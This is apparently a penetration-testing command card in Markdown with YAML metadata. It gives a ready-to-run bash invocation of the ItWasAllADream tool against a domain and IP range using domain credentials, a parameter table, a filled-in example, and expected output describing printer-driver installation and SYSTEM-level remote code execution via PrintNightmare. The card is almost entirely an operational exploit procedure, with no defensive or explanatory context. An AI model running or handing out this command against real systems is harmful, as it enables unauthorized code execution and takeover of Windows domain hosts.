---
type: command
executor: bash
data: itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN $_TARGET_CIDR
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - exploitation
  - rce
verified: true
validated: true
---

# run-itwasalladream-locally

## Command

```bash
itwasalladream -u $_USERNAME -p $_PASSWORD -d $_DOMAIN $_TARGET_CIDR
```

## Description

Executes the ItWasAllADream tool locally to exploit PrintNightmare by sending crafted RPC calls to the target, achieving RCE with SYSTEM privileges. Must be run in the activated Poetry environment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_USERNAME | Domain username for authentication | Yes |
| -p $_PASSWORD | Domain password | Yes |
| -d $_DOMAIN | Target domain (e.g., domain.local) | Yes |
| $_TARGET_CIDR | Target IP or CIDR range (e.g., 10.10.10.10/24) | Yes |

## Examples

### Basic Usage

```bash
itwasalladream -u user -p Password123 -d domain.local 10.10.10.10/24
```

## Expected Output

[*] Enumerating targets...
[*] Adding printer driver on 10.10.10.10...
[*] Executing payload...
[+] RCE successful: Command output or shell established.

## Related

- [[procedures/PrintNightmare-Remote-Code-Execution]]
